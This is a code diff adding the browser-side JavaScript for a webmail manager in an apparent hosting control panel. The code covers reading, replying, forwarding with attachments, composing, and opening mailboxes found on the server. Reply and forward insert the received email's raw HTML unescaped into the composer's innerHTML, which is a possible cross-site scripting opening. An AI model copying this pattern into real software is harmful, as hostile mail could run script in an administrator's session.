+    +'<div class="wm-read-meta2"><span>to '+esc(m.to_text||'')+'</span><span>'+esc(m.date_text||'')+'</span></div>'
+    +'<div class="wm-read-acts">'
+      +'<button type="button" class="btn btn-xs btn-p" id="wmReply"><svg viewBox="0 0 24 24"><polyline points="9 17 4 12 9 7"/><path d="M20 18v-2a4 4 0 0 0-4-4H4"/></svg>Reply</button>'
+      +'<button type="button" class="btn btn-xs btn-g" id="wmReplyAll"><svg viewBox="0 0 24 24"><polyline points="7 17 2 12 7 7"/><polyline points="12 17 7 12 12 7"/><path d="M22 18v-2a4 4 0 0 0-4-4H7"/></svg>Reply all</button>'
+      +'<button type="button" class="btn btn-xs btn-g" id="wmForward"><svg viewBox="0 0 24 24"><polyline points="15 17 20 12 15 7"/><path d="M4 18v-2a4 4 0 0 1 4-4h12"/></svg>Forward</button>'
+      +'<button type="button" class="btn btn-xs btn-g" id="wmMarkUnread"><svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 7l10 6 10-6"/></svg>Mark unread</button>'
+      +'<button type="button" class="btn btn-xs btn-g" id="wmDeleteOne"'+(can.delete?'':' disabled title="'+esc(S.can.why||'This mailbox cannot delete messages.')+'"')+'><svg viewBox="0 0 24 24"><path d="M3 6h18"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>Delete</button>'
+      +'<button type="button" class="btn btn-xs btn-g" id="wmDownloadOne"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</button>'
+      +(S.acc&&S.acc.webmail?'<button type="button" class="btn btn-xs btn-g" id="wmWebmail"><svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>Open in webmail</button>':'')
+    +'</div></div>'
+    +'<div class="wm-tabs">'+tabHtml+'</div>'
+    +'<div class="wm-read-body">'+bodyHtml+'</div>'
+    +(atts?'<div class="wm-atts"><div class="wm-atts-h">'+num((m.attachments||[]).length)+' attachment'+((m.attachments||[]).length===1?'':'s')+'</div>'+atts+'</div>':'');
+  const frame=el('wmFrame');
+  if(frame)frame.srcdoc='<!DOCTYPE html><html><head><meta charset="utf-8"><base target="_blank"><style>'
+    +'html,body{margin:0;padding:16px;background:#fff;color:#1b1b1b;font:14px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;word-break:break-word}'
+    +'img{max-width:100%;height:auto}table{max-width:100%}a{color:#1a5fd0}blockquote{margin:0 0 0 2px;padding-left:12px;border-left:2px solid #d8d8d8;color:#555}'
+    +'pre{white-space:pre-wrap;overflow-wrap:anywhere}</style></head><body>'+(S.msg.html||'')+'</body></html>';
+  qa('#wmRead .wm-tab').forEach(b=>b.addEventListener('click',()=>{S.view=b.dataset.view;renderRead();}));
+  const on=(id,fn)=>{const n=el(id);if(n)n.addEventListener('click',fn);};
+  on('wmReply',()=>reply(false,false));
+  on('wmReplyAll',()=>reply(true,false));
+  on('wmForward',()=>reply(false,true));
+  on('wmDownloadOne',()=>download((S.msg.links||{}).eml));
+  on('wmMarkUnread',async()=>{
+    const d=await api('flag',{account:S.acc.id,folder:S.folder,uid:S.msg.uid,seen:''});
+    if(!d.ok){flash('bad',d.error||'That could not be marked.');return;}
+    const row=S.msgs.filter(x=>x.uid===d.uid)[0];
+    if(row)row.seen=false;
+    S.msg.uid=d.uid;
+    renderMsgs();flash('good','Marked unread.');
+  });
+  on('wmDeleteOne',async()=>{
+    if(!confirm('Delete this message?'))return;
+    const gone=S.msg.uid;
+    const d=await api('delete',{account:S.acc.id,folder:S.folder,uids:JSON.stringify([gone])});
+    if(!d.ok){flash('bad',d.error||'It could not be deleted.');return;}
+    S.msg=null;renderRead();
+    S.msgs=S.msgs.filter(m=>m.uid!==gone);
+    renderMsgs();renderBulk();
+    flash('good','Deleted'+(d.moved?' (moved to '+d.moved+')':'')+'.');
+    refreshFolder();
+  });
+  on('wmWebmail',async()=>{
+    flash('','Opening cPanel webmail…');
+    const d=await api('signin',{account:S.acc.id});
+    if(!d.ok){flash('bad',d.error||'cPanel refused to open it.');return;}
+    window.open(d.url,'_blank','noopener');
+    flash('good','cPanel webmail opened signed in.');
+  });
+}
+function reply(all,forward){
+  const m=S.msg;
+  if(!m)return;
+  const to=forward?'':(m.from_email||'');
+  const cc=all?((m.cc||[]).map(a=>a.email).join(', ')):'';
+  const subject=(forward?'Fwd: ':(/^re:/i.test(m.subject||'')?'':'Re: '))+(m.subject||'');
+  let quoted='';
+  if(forward){
+    quoted='<br><br><div class="wm-quote">---------- Forwarded message ----------<br>From: '+esc(m.from||'')+' &lt;'+esc(m.from_email||'')+'&gt;<br>To: '+esc(m.to_text||'')+'<br>Date: '+esc(m.date_text||'')+'<br>Subject: '+esc(m.subject||'')+'</div><br>'
+      +(m.html||('<pre>'+esc(m.plain||'')+'</pre>'));
+  }else{
+    quoted='<br><br><blockquote style="margin:0;padding-left:12px;border-left:2px solid #cbd5e1;color:#475569">'
+      +'<div>On '+esc(m.date_text||'')+', '+esc(m.from||m.from_email)+' wrote:</div><br>'
+      +(m.html||('<pre>'+esc(m.plain||'')+'</pre>'))+'</blockquote>';
+  }
+  openComposer({to:to,cc:cc,subject:subject,html:quoted});
+  if(forward)carryAttachments(m);
+}
+/* a forwarded message should still carry what was attached to it, not just
+   the words: the files are fetched back through their own signed links */
+async function carryAttachments(m){
+  const list=(m.attachments||[]).filter(a=>a&&a.url);
+  if(!list.length)return;
+  setCoStatus('','Fetching the '+(list.length===1?'file that came':list.length+' files that came')+' with the message…');
+  for(const a of list){
+    try{
+      const r=await fetch(a.url,{credentials:'same-origin'});
+      if(!r.ok)continue;
+      const b=await r.blob();
+      const data=await new Promise(res=>{
+        const fr=new FileReader();
+        fr.onload=()=>{const t=String(fr.result||'');const c=t.indexOf(',');res(c>=0?t.slice(c+1):'');};
+        fr.onerror=()=>res('');
+        fr.readAsDataURL(b);
+      });
+      if(!data)continue;
+      S.attachments.push({name:a.name||'attachment',type:a.type||b.type||'application/octet-stream',size:b.size||a.size||0,data:data});
+    }catch(e){/* one file that cannot be carried must not stop the rest */}
+  }
+  renderAtts();
+  if(S.attachments.length)setCoStatus('','The file'+(S.attachments.length===1?' that came with it is':'s that came with it are')+' attached.');
+  else setCoStatus('bad','The files on the message could not be carried over — attach them again by hand.');
+}
+
+/* ── writing a message ──────────────────────────────────────────────────── */
+function openComposer(seed){
+  const a=S.acc;
+  if(!a){flash('bad','Pick a mailbox first — a message must be sent from one.');return;}
+  S.compose=Object.assign({to:'',cc:'',bcc:'',subject:'',html:'',showCc:false,showBcc:false},seed||{});
+  S.attachments=[];
+  el('wmCoFrom').textContent=a.email+(a.name&&a.name!==a.email?' ('+a.name+')':'');
+  el('wmCoTo').value=S.compose.to||'';
+  el('wmCoCc').value=S.compose.cc||'';
+  el('wmCoBcc').value=S.compose.bcc||'';
+  el('wmCoSubject').value=S.compose.subject||'';
+  el('wmCoBody').innerHTML=S.compose.html||'';
+  el('wmCoSource').value=S.compose.html||'';
+  el('wmCoCcRow').style.display=(S.compose.cc?'flex':'none');
+  el('wmCoBccRow').style.display='none';
+  el('wmCoSource').style.display='none';
+  el('wmCoEditorWrap').style.display='flex';
+  el('wmCoStatus').textContent='';
+  el('wmCoStatus').className='wm-co-status';
+  renderAtts();
+  openMod('webmailComposeOv');
+  setTimeout(()=>el('wmCoTo').focus(),60);
+}
+function renderAtts(){
+  const box=el('wmCoAtts');
+  if(!box)return;
+  if(!S.attachments.length){box.innerHTML='';return;}
+  box.innerHTML=S.attachments.map((a,i)=>'<span class="wm-co-att"><b>'+esc(a.name)+'</b><i>'+esc(size(a.size))+'</i>'
+    +'<button type="button" data-att="'+i+'" title="Remove"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></span>').join('');
+  qa('#wmCoAtts [data-att]').forEach(b=>b.addEventListener('click',()=>{
+    S.attachments.splice(Number(b.dataset.att),1);renderAtts();
+  }));
+}
+function editorHtml(){
+  const src=el('wmCoSource');
+  if(src&&src.style.display!=='none')return src.value;
+  const ed=el('wmCoBody');
+  return ed?ed.innerHTML:'';
+}
+function setCoStatus(kind,text){
+  const box=el('wmCoStatus');
+  if(!box)return;
+  box.className='wm-co-status '+(kind||'');
+  box.textContent=text||'';
+}
+async function sendCompose(){
+  const to=el('wmCoTo').value.trim();
+  if(!to){setCoStatus('bad','A message needs at least one recipient.');el('wmCoTo').focus();return;}
+  const html=editorHtml();
+  const plain=(el('wmCoBody').innerText||'').trim();
+  if(!html.trim()&&!plain){setCoStatus('bad','The message is empty.');return;}
+  const btn=el('wmCoSend');
+  btn.disabled=true;
+  setCoStatus('','Sending…');
+  const d=await api('send',{
+    account:S.acc.id,
+    to:to,
+    cc:el('wmCoCcRow').style.display==='none'?'':el('wmCoCc').value.trim(),
+    bcc:el('wmCoBccRow').style.display==='none'?'':el('wmCoBcc').value.trim(),
+    subject:el('wmCoSubject').value,
+    html:html,
+    plain:plain,
+    attachments:JSON.stringify(S.attachments.map(a=>({name:a.name,type:a.type,data:a.data})))
+  });
+  btn.disabled=false;
+  if(!d.ok){setCoStatus('bad',d.error||'The message was not sent.');return;}
+  setCoStatus('good','Sent through '+(d.via||'the mail server')+'.');
+  setTimeout(()=>{closeMod('webmailComposeOv');},900);
+  if(S.acc&&S.can.send){setTimeout(refreshFolder,1200);}
+}
+
+/* ── the window itself ─────────────────────────────────────────────────── */
+async function boot(){
+  if(!el('webmailOv'))return;
+  el('wmList').innerHTML='<div class="wm-empty">Looking for mail…</div>';
+  el('wmFoot').innerHTML='';
+  el('wmHeadMain').innerHTML='';
+  const d=await api('discover');
+  if(!d.ok){
+    el('wmList').innerHTML='<div class="wm-empty bad">'+esc(d.error||'The mailboxes could not be listed.')+'</div>';
+    return;
+  }
+  S.accounts=d.accounts||[];
+  S.notes=d.notes||[];
+  renderRail();
+  renderNotes(d);
+  renderHead();
+  if(S.acc){
+    const again=S.accounts.filter(a=>a.email===S.acc.email)[0];
+    if(again){openMailbox(again);return;}
+  }
+  /* the window never sits empty while a mailbox that answers exists: it tries
+     them in the order they are listed until one hands over its folders */
+  const tries=S.accounts.filter(a=>a.can&&a.can.read).slice(0,6);
+  for(let i=0;i<tries.length;i++){
+    if(await openMailbox(tries[i]))return;
+  }
+  el('wmMsgs').innerHTML='<div class="wm-empty">No mailbox on this server could be opened directly. '
+    +'Every one of them says why in the pane above.</div>';
+  renderRead(null);
+}
+function filterMsgs(){
+  S.msgFilter=el('wmMsgSearch').value||'';
+  renderMsgs();
+}
+
+/* wiring — every listener is bound once, on the elements that never change */
+el('webmailBtn').addEventListener('click',()=>{openMod('webmailOv');boot();});
+el('webmailClose').addEventListener('click',()=>closeMod('webmailOv'));
+el('wmRescan').addEventListener('click',()=>{S.acc=null;boot();});
+el('wmComposeBtn').addEventListener('click',()=>openComposer({}));
+el('wmMsgSearch').addEventListener('input',filterMsgs);
+el('wmMailSearch').addEventListener('input',()=>{S.search=el('wmMailSearch').value||'';renderRail();});
+el('wmReload').addEventListener('click',()=>{if(S.acc)refreshFolder();});
+el('webmailComposeClose').addEventListener('click',()=>closeMod('webmailComposeOv'));
+el('wmCoSend').addEventListener('click',sendCompose);
+el('wmCoCcToggle').addEventListener('click',()=>{
+  const r=el('wmCoCcRow');
+  r.style.display=r.style.display==='none'?'flex':'none';
+  if(r.style.display!=='none')el('wmCoCc').focus();
+});
+el('wmCoBccToggle').addEventListener('click',()=>{
+  const r=el('wmCoBccRow');
+  r.style.display=r.style.display==='none'?'flex':'none';
+  if(r.style.display!=='none')el('wmCoBcc').focus();
+});
+el('wmCoSourceToggle').addEventListener('click',()=>{
+  const src=el('wmCoSource'),wrap=el('wmCoEditorWrap');
+  if(src.style.display==='none'){
+    src.value=el('wmCoBody').innerHTML;
+    src.style.display='block';wrap.style.display='none';
+    el('wmCoSourceToggle').classList.add('is-on');
+  }else{
+    el('wmCoBody').innerHTML=src.value;
+    src.style.display='none';wrap.style.display='flex';
+    el('wmCoSourceToggle').classList.remove('is-on');
+  }
+});
+el('wmCoFile').addEventListener('change',(ev)=>{
+  const files=Array.prototype.slice.call(ev.target.files||[]);
+  if(!files.length)return;
+  let left=files.length;
+  files.forEach(f=>{
+    const fr=new FileReader();
+    fr.onload=()=>{
+      const s=String(fr.result||'');
+      const comma=s.indexOf(',');
+      S.attachments.push({name:f.name,type:f.type||'application/octet-stream',size:f.size,data:comma>=0?s.slice(comma+1):''});
+      if(--left===0){renderAtts();ev.target.value='';}
+    };
+    fr.onerror=()=>{if(--left===0){renderAtts();ev.target.value='';}};
+    fr.readAsDataURL(f);
+  });
+});
+qa('#wmCoToolbar [data-cmd]').forEach(b=>{
+  b.addEventListener('click',()=>{
+    el('wmCoBody').focus();
+    const cmd=b.dataset.cmd,val=b.dataset.val||null;
+    try{document.execCommand(cmd,false,val);}catch(e){}
+  });
+});
+qa('#wmCoToolbar [data-block]').forEach(b=>{
+  b.addEventListener('click',()=>{
+    el('wmCoBody').focus();
+    try{document.execCommand('formatBlock',false,'<'+b.dataset.block+'>');}catch(e){}
+  });
+});
+el('wmCoLink').addEventListener('click',()=>{
+  const url=prompt('Address of the link:','https://');
+  if(!url)return;
+  el('wmCoBody').focus();
+  try{document.execCommand('createLink',false,url);}catch(e){}
+});
+el('webmailComposeOv').addEventListener('keydown',(ev)=>{
+  if((ev.ctrlKey||ev.metaKey)&&ev.key==='Enter'){ev.preventDefault();sendCompose();}
+});
+document.addEventListener('keydown',(ev)=>{
+  if(ev.key==='Escape'&&el('webmailOv').classList.contains('open')){
+    if(el('webmailComposeOv').classList.contains('open'))closeMod('webmailComposeOv');
+  }
+});
 })(); // end Webmail Manager IIFE
 
 /* ═══════════════════════════════════════
